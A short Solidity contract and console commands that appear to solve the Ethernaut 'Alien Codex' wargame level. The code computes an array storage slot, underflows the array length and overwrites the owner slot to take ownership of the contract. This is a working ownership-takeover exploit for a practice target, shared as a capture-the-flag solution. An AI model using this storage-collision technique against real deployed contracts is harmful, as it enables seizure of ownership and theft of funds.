// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

contract AlienCodexCrack {
  // we look for array storage collision

  // Result: 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6
  function test1() public pure returns(bytes32){
    return keccak256(abi.encodePacked(bytes32(uint256(1))));
  }
  // Result: 35707666377435648211887908874984608119992236509074197713628505308453184860938
  function test2() public view returns(uint256){
    return (2**256) - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6;
  }
}

// Next we run
await contract.make_contact();
await contract.retract();
await contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938', 'your_address_with_prepending_zeros(bytes32)')
await contract.owner(); // Check owner changed?
